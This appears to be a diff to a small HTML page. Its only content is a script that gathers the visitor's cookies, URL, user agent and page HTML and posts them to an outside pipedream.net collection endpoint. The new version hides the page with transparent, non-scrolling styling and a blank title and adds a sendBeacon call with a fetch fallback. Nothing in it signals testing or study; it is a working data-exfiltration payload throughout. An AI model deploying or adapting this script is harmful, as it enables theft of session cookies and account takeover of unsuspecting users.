@@ -1,19 +1,40 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      const data = {
-        cookie: document.cookie,
-        location: location.href,
-        userAgent: navigator.userAgent,
-        html: document.documentElement.outerHTML
-      };
+<head>
+  <meta charset="UTF-8">
+  <title>.</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: transparent;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+<script>
+const data = {
+  cookie: document.cookie,
+  location: location.href,
+  userAgent: navigator.userAgent,
+  html: document.documentElement?.outerHTML?.slice(0, 1000),
+  ts: Date.now(),
+  id: Math.random().toString(36).substring(2)
+};
 
-      fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(data)
-      });
-    </script>
-  </body>
+try {
+  navigator.sendBeacon(
+    "https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net",
+    new Blob([JSON.stringify(data)], { type: "application/json" })
+  );
+} catch (e) {
+  fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify({ ...data, error: e.toString() })
+  });
+}
+</script>
+</body>
 </html>
